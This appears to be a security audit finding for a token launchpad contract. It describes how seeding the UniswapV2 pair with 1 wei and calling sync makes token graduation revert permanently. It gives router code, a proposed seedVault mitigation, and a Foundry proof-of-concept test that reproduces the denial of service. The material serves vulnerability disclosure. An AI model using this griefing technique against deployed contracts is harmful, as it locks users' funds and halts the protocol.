      "body": "## Finding description\n\n*Follow the provided links in numerical order.*\n\nThe current logic of the contract is that when LaunchToken reaches BONDING_SUPPLY on a buy, the contract should automatically deposit 20% of the token into the UniSwapV2 pool and it should also deposit all of the quoteReserve it holds. \n\nHowever, an attacker can permanently prevent a token from graduating with 1 wei direct deposit into the uniswap pair. In uniswapV2 a pair can be created easily by providing the LaunchToken address and quote address.\n\nHow will the attack work:\n\n1. Lets say that a token is near its graduation, the attacker can deploy the pair (token,quote) before the graduation.\n\n2. He can then make a direct deposit of 1 wei into the pair and call sync, this will bump the internal reserves of tokenA (depends on which is the smaller token, in my ex. I will make the quote token token A) to 1 wei.\n\n3. When graduation comes in _graduate we make a call to _createPairAndSwapRemaining, inside that function we try to add liquidity to the pair by calling ` uniV2Router.addLiquidity`, however given the attacker initiated the attack before that, the call will fail, making the whole transaction revert, disabling graduation forever.\n\nHere is why it fails:\n\nLets look inside _addLiquidity which is called directly addLiquidity by  in the UniSwapV2Router:\n```\n   function _addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin\n    ) private returns (uint amountA, uint amountB) {\n        // create the pair if it doesn't exist yet\n        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n            IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n        }\n        (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n      @>  if (reserveA == 0 && reserveB == 0) {\n            (amountA, amountB) = (amountADesired, amountBDesired);\n        } else {\n           @> uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n            if (amountBOptimal <= amountBDesired) {\n                require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n                (amountA, amountB) = (amountADesired, amountBOptimal);\n            } else {\n                uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n                assert(amountAOptimal <= amountADesired);\n                require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n                (amountA, amountB) = (amountAOptimal, amountBDesired);\n            }\n        }\n    }\n```\nGiven that the attacker made the reserveA for example 1 wei we will go into the first else path, where we will call quote, lets look inside quote:\n\n```\n   function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n      @>  require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    }\n```\n\nGiven that the attacker called sync, reserveA will be 1 wei, making the call revert as reserveB will be 0.\n\nThis is a permanent DoS because LaunchToken cannot be transfered until graduation, they can only be moved by the launchpad and the gte router. There is no way that anybody moves out token into the pair either, if somebody tries to move it in launchpad and set the final recipient as the pair, we still revert as the function _assertValidRecipient makes sure the final recipient is not the pair.\n\n## Impact\nPermanent DoS in a way that the contract is stopped performing its main functionality, given that in the launch of the new contract a lot of tokens will be created as a lot of users will want to arbitrage from the new functionality GTE offers, an attacker can make a massive attack by suppling 1 wei of quote to each token made. Given that this bug will only appear when one of the newly deployed tokens reach their BONDING_SUPPLY, this can be catastrophic, as users will be forced to pull out all of their quote. \n\nI think this is a High as it breaks core contract functionality. The attack is cheap and easy.\n\n## Recommended mitigation steps\n\nWhile I don't know if this is the best mitigation, I think its a pretty solid one.\n\nAdd this function:\n```\n  function seedVault(LaunchToken token, address quote) internal {\n        token.mint(1000);\n        token.approve(address(uniV2Router), 1000);\n        quote.safeTransferFrom(msg.sender, address(this), 1000);\nquote.safeApprove(address(uniV2Router), 1000)\n        // as token addresses can be determenistic this should be a call that if failed doesn't revert the transaction\n        try uniV2Factory.createPair(address(token), quote) {} catch {}\n        uniV2Router.addLiquidity({\n            tokenA: address(token),\n            tokenB: address(quote),\n            amountADesired: 1000,\n            amountBDesired: 1000,\n            amountAMin: 0,\n            amountBMin: 0,\n            to: address(launchpadLPVault),\n            deadline: block.timestamp\n        });\n    }\n```\nAdd this in launch:\n```\n  function launch(string memory name, string memory symbol, string memory mediaURI)\n        external\n        payable\n        nonReentrant\n        returns (address token)\n    {\n        if (msg.value != launchFee) revert BadLaunchFee();\n\n        address quote = address(currentQuoteAsset);\n        IBondingCurveMinimal curve = currentBondingCurve;\n\n        if (quote == address(0)) revert UninitializedQuote();\n        if (address(curve) == address(0)) revert UninitializedCurve();\n\n        token = address(new LaunchToken(name, symbol, mediaURI, gteRouter));\n\n        curve.initializeCurve(token, TOTAL_SUPPLY, BONDING_SUPPLY);\n        distributor.createRewardsPair(token, quote);\n\n        _launches[token] = LaunchData({active: true, curve: curve, quote: quote});\n\n        @> seedVault(LaunchToken(token), quote);\n\n        emit TokenLaunched({\n            dev: msg.sender,\n            token: token,\n            quoteAsset: quote,\n            bondingCurve: curve,\n            timestamp: block.timestamp,\n            eventNonce: LaunchpadEventNonce.inc()\n        });\n\n        LaunchToken(token).mint(TOTAL_SUPPLY);\n    }\n```\nWe should mint and seed the vault with 1000 wei otherwise it will revert, imo this is the easiest mitigation. Even if somebody before that created a pair and funded it with 1 wei the current design will make the creation of such a token revert from the beginning. So owners can call launch again with different parameters.",
      "proofOfConcept": "Copy paste this test inside Launchpad.t.sol, I have create a little uniswapMock:\n\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.27;\n\nimport {Launchpad} from \"contracts/launchpad/Launchpad.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\nimport {IBondingCurveMinimal} from \"contracts/launchpad/BondingCurves/IBondingCurveMinimal.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\nimport {LaunchpadLPVault} from \"contracts/launchpad/LaunchpadLPVault.sol\";\n\nimport {ERC1967Factory} from \"@solady/utils/ERC1967Factory.sol\";\nimport {FixedPointMathLib} from \"@solady/utils/FixedPointMathLib.sol\";\n\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\nimport {MockDistributor} from \"../mocks/MockDistributor.sol\";\n\nimport {IOperatorPanel} from \"contracts/utils/interfaces/IOperatorPanel.sol\";\nimport {IUniswapV2Pair} from \"contracts/launchpad/interfaces/IUniswapV2Pair.sol\";\nimport {UniV2Bytecode} from \"./integration/UniV2Bytecode.t.sol\";\n\nimport {SafeMath} from \"lib/gte-univ2/src/core/libraries/SafeMath.sol\";\n\nimport \"forge-std/Test.sol\";\n\n// Minimal UniswapV2 factory interface\ninterface IUniswapV2Factory {\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\nlibrary UniswapV2Library {\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n        require(tokenA != tokenB, \"UniswapV2Library: IDENTICAL_ADDRESSES\");\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), \"UniswapV2Library: ZERO_ADDRESS\");\n    }\n\n    function pairFor(address factory, address tokenA, address tokenB) internal view returns (address pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = IUniswapV2Factory(factory).getPair(token0, token1);\n    }\n\n    function getReserves(address factory, address tokenA, address tokenB)\n        public\n        view\n        returns (uint256 reserveA, uint256 reserveB)\n    {\n        (address token0,) = sortTokens(tokenA, tokenB);\n        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n        (reserveA, reserveB) =\n            tokenA == token0 ? (uint256(reserve0), uint256(reserve1)) : (uint256(reserve1), uint256(reserve0));\n    }\n\n    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {\n        require(amountA > 0, \"UniswapV2Library: INSUFFICIENT_AMOUNT\");\n        require(reserveA > 0 && reserveB > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        amountB = (amountA * reserveB) / reserveA;\n    }\n}\n\ncontract StrictUniV2Router is ERC20Harness {\n    using SafeMath for uint256;\n\n    address public factory;\n    uint112 private reserve0; // uses single storage slot, accessible via getReserves\n    uint112 private reserve1; // uses single storage slot, accessible via getReserves\n    address token0;\n    address token1;\n\n    constructor(address _factory) ERC20Harness(\"UNI-V2\", \"UNI-V2\") {\n        factory = _factory;\n    }\n\n    function setToken1Token0(address _token0, address _token1) external {\n        (address _token0returned, address _token1returned) = UniswapV2Library.sortTokens(_token0, _token1);\n        token0 = _token0returned;\n        token1 = _token1returned;\n    }\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) public virtual returns (uint256 amountA, uint256 amountB, uint256 liquidity) {\n        // create the pair if it doesn't exist yet\n        //@audit in the original code we would create a pair, however for the current test we wont need that\n        // if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n        //     IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n        // }\n        (uint256 reserveA, uint256 reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n        if (reserveA == 0 && reserveB == 0) {\n            (amountA, amountB) = (amountADesired, amountBDesired);\n        } else {\n            uint256 amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n            if (amountBOptimal <= amountBDesired) {\n                require(amountBOptimal >= amountBMin, \"UniswapV2Router: INSUFFICIENT_B_AMOUNT\");\n                (amountA, amountB) = (amountADesired, amountBOptimal);\n            } else {\n                uint256 amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n                assert(amountAOptimal <= amountADesired);\n                require(amountAOptimal >= amountAMin, \"UniswapV2Router: INSUFFICIENT_A_AMOUNT\");\n                (amountA, amountB) = (amountAOptimal, amountBDesired);\n            }\n        }\n        // @audit we wont reach these so I will comment them out, however they will be present in the original code\n        // address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        // TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        // TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        // liquidity = IUniswapV2Pair(pair).mint(to);\n    }\n\n    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {\n        require(amountA > 0, \"UniswapV2Library: INSUFFICIENT_AMOUNT\");\n        // @audit we will revert here, that means if somebody creates the vault then adds liquidity from the quote token , he will DoS the contract\n        require(reserveA > 0 && reserveB > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        amountB = (amountA * reserveB) / reserveA;\n    }\n\n    function sortTokens(address tokenA, address tokenB) public pure returns (address token0, address token1) {\n        require(tokenA != tokenB, \"UniswapV2Library: IDENTICAL_ADDRESSES\");\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), \"UniswapV2Library: ZERO_ADDRESS\");\n    }\n\n    function sync() external {\n        _update(\n            ERC20Harness(token0).balanceOf(address(this)),\n            ERC20Harness(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    }\n\n    function _update(uint256 balance0, uint256 balance1, uint112 _reserve0, uint112 _reserve1) private {\n        // @audit the function typically computes the price, the time elapsed but in our example we wont need that\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n    }\n\n    function getReserves() external view returns (uint112, uint112, uint32) {\n        return (reserve0, reserve1, 0);\n    }\n\n    function skim(address to) external {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n\n        transfer(to, ERC20Harness(_token0).balanceOf(address(this)).sub(reserve0));\n        transfer(to, ERC20Harness(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n    // Stubs to satisfy any interface expectations (won't be reached in this test)\n    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256) {\n        return amountOut;\n    }\n\n    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256)\n        external\n        pure\n        returns (uint256[] memory amounts)\n    {\n        amounts = new uint256[](2);\n        amounts[0] = 0;\n        amounts[1] = 0;\n    }\n}\n\ncontract Launchpad_DoS_Strict_Test is Test {\n    using FixedPointMathLib for uint256;\n\n    ERC1967Factory factory;\n    Launchpad launchpad;\n    IBondingCurveMinimal curve;\n    LaunchpadLPVault launchpadLPVault;\n    ERC20Harness quoteToken;\n\n    address uniV2FactoryAddr;\n    StrictUniV2Router strictRouter;\n\n    address distributor;\n    address owner = makeAddr(\"owner\");\n    address user = makeAddr(\"user\");\n    address dev = makeAddr(\"dev\");\n    address clobManager = makeAddr(\"clob manager\");\n    address operatorAddr = makeAddr(\"operator\");\n\n    address token;\n    uint256 BONDING_SUPPLY;\n\n    function setUp() public {\n        quoteToken = new ERC20Harness(\"Quote\", \"QTE\");\n\n        uniV2FactoryAddr = makeAddr(\"UNIV2_FACTORY\");\n        vm.etch(uniV2FactoryAddr, UniV2Bytecode.UNIV2_FACTORY);\n\n        strictRouter = new StrictUniV2Router(uniV2FactoryAddr);\n\n        // Proxy factory\n        factory = new ERC1967Factory();\n\n        bytes32 launchpadSalt = bytes32(abi.encode(\"GTE.V1.TESTNET.LAUNCHPAD\", owner));\n        launchpad = Launchpad(factory.predictDeterministicAddress(launchpadSalt));\n\n        address c_logic = address(new SimpleBondingCurve(address(launchpad)));\n        address v_logic = address(new LaunchpadLPVault());\n        curve = SimpleBondingCurve(factory.deploy(address(c_logic), owner));\n        launchpadLPVault = LaunchpadLPVault(factory.deploy(address(v_logic), owner));\n\n        vm.mockCall(\n            operatorAddr,\n            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, user, address(0)),\n            abi.encode(0)\n        );\n\n        // Distributor\n        distributor = address(new MockDistributor());\n        vm.label(distributor, \"MOCK_DISTRIBUTOR\");\n\n        address l_logic =\n            address(new Launchpad(address(strictRouter), address(0), clobManager, operatorAddr, distributor));\n\n        vm.prank(owner);\n        Launchpad(\n            factory.deployDeterministicAndCall({\n                implementation: l_logic,\n                admin: owner,\n                salt: launchpadSalt,\n                data: abi.encodeCall(\n                    Launchpad.initialize,\n                    (\n                        owner,\n                        address(quoteToken),\n                        address(curve),\n                        address(launchpadLPVault),\n                        abi.encode(uint256(200_000_000 ether), uint256(10e6)) // (VIRTUAL_BASE, VIRTUAL_QUOTE)\n                    )\n                )\n            })\n        );\n\n        vm.prank(owner);\n        launchpad.updateInitCodeHash(hex\"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f\");\n\n        token = _launchToken();\n        BONDING_SUPPLY = curve.bondingSupply(token);\n\n        // Approvals\n        vm.startPrank(user);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        vm.stopPrank();\n    }\n\n    function _launchToken() internal returns (address) {\n        uint256 fee = launchpad.launchFee();\n        deal(dev, 30 ether);\n        vm.prank(dev);\n        return launchpad.launch{value: fee}(\"TestToken\", \"TST\", \"https://testtoken.com\");\n    }\n\n    /// Attacker seeds the exact pair with 1 wei on one side -> graduation addLiquidity reverts.\n    function test_DoS_Graduation_reverts_with_insufficient_liquidity() public {\n        // 1. Move close to graduation (leave 1000e18)\n        deal(address(quoteToken), user, type(uint256).max);\n        vm.prank(user);\n        launchpad.buy(\n            ILaunchpad.BuyData({\n                account: user,\n                token: token,\n                recipient: user,\n                amountOutBase: BONDING_SUPPLY - 1000e18,\n                maxAmountInQuote: type(uint256).max\n            })\n        );\n\n        // 2 Attacker creates the pair and seeds it with 1 wei on quote side\n        address pair = IUniswapV2Factory(uniV2FactoryAddr).getPair(address(quoteToken), token);\n        if (pair == address(0)) pair = IUniswapV2Factory(uniV2FactoryAddr).createPair(address(quoteToken), token);\n        address attacker = makeAddr(\"attacker\");\n        deal(address(quoteToken), attacker, 1);\n\n        vm.prank(attacker);\n        ERC20Harness(address(quoteToken)).transfer(pair, 1);\n        IUniswapV2Pair(pair).sync();\n\n        (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves();\n        console2.log(\"reserves after attacker seed\", r0, r1);\n        assertTrue((r0 == 1 && r1 == 0) || (r0 == 0 && r1 == 1), \"expected one-sided reserves\");\n\n        // 3 Final buy triggers graduation → router.addLiquidity() reads (1,0) and reverts\n        vm.prank(user);\n        vm.expectRevert(bytes(\"UniswapV2Library: INSUFFICIENT_LIQUIDITY\"));\n        launchpad.buy(\n            ILaunchpad.BuyData({\n                account: user,\n                token: token,\n                recipient: user,\n                amountOutBase: 1001e18,\n                maxAmountInQuote: type(uint256).max\n            })\n        );\n    }\n}\n\n```\n\nRun with: forge test --match-test test_DoS_Graduation_reverts_with_insufficient_liquidity --via-ir -vvvv\n\nConsole.log:\n```\n [Revert] UniswapV2Library: INSUFFICIENT_LIQUIDITY\n```",
